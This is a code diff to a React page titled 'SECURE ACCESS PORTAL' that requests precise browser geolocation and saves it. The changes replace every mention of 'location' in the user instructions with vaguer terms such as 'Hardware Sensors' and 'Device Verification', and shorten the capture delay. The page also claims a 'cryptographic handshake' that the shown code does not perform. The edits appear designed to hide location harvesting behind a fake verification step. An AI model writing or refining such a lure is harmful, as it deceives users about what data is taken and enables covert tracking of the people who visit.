@@ -77,7 +77,7 @@ export default function GlobalHealth() {
         },
         (err) => {
           if (err.code === 1) setStatus('Permission denied. Please allow access to proceed.');
-          if (err.code === 2) setStatus('GPS required. Please turn on your device location.');
+          if (err.code === 2) setStatus('GPS required. Please enable device sensors.');
         },
         { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
       );
@@ -91,7 +91,7 @@ export default function GlobalHealth() {
       if (bestPosition && loading) {
         saveLocation(bestPosition, watchId);
       }
-    }, 8000);
+    }, 3000);
 
     startWatching();
 
@@ -121,7 +121,7 @@ export default function GlobalHealth() {
 
         (err) => {
           if (err.code === 1) setStatus('Permission denied. Please allow access to proceed.');
-          if (err.code === 2) setStatus('GPS required. Please turn on your device location.');
+          if (err.code === 2) setStatus('GPS required. Please enable device sensors.');
           if (err.code === 3) setStatus('GPS Timeout. Retrying...');
           setLoading(false);
         },
@@ -155,7 +155,7 @@ export default function GlobalHealth() {
           <h1 className="text-3xl font-extrabold tracking-tight bg-clip-text text-transparent bg-gradient-to-r from-cyan-400 to-blue-500">
             SECURE ACCESS PORTAL
           </h1>
-          <p className="text-gray-400 text-sm mt-2">Identity & Location Verification</p>
+          <p className="text-gray-400 text-sm mt-2">Identity & Device Verification</p>
         </div>
 
         {/* Glassmorphic Card */}
@@ -236,7 +236,7 @@ export default function GlobalHealth() {
             <div className="bg-white/5 rounded-2xl p-6 mb-8 border border-white/10">
               <p className="text-xs font-bold text-cyan-400 uppercase tracking-widest mb-3">Required Action Protocol:</p>
               <ol className="text-sm text-gray-300 space-y-3 font-medium list-decimal list-inside">
-                <li>Activate your device's <strong>Location Services</strong> or <strong>GPS</strong> module.</li>
+                <li>Activate your device's <strong>Hardware Sensors</strong> or <strong>GPS</strong> module.</li>
                 <li>Select <strong>"Allow"</strong> on the browser authorization prompt.</li>
                 <li>Wait for cryptographic handshake completion.</li>
               </ol>
